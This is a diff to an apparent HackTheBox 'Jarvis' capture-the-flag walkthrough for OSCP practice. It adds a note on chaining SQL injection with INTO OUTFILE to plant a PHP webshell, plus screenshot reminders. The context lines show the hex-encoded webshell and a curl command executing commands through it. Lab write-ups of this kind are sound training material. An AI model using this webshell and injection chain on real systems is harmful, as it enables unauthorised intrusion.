@@ -183,6 +183,8 @@ curl -s -G "http://jarvis.htb/room.php" \
 
 ## Эксплуатация (RCE via INTO OUTFILE)
 
+No CVE (custom vulnerability) - SQL injection in the custom `room.php` endpoint (HTB-specific Stark Hotel app, no public CVE), chained with `INTO OUTFILE` to drop a PHP webshell into the web root.
+
 ### Определение web-root
 
 ```bash
@@ -219,6 +221,9 @@ Hex `3c3f7068702073797374656d28245f4745545b2778275d293b203f3e` = `<?php system($
 curl "http://jarvis.htb/x.php?x=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ### Reverse shell
 
@@ -321,6 +326,9 @@ cat /home/pepper/user.txt
 # <USER_FLAG>
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 ---
 
 ## Повышение Привилегий (pepper → root)
@@ -387,6 +395,9 @@ cd /root
 cat /root/root.txt
 # <ROOT_FLAG>
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 ---
 
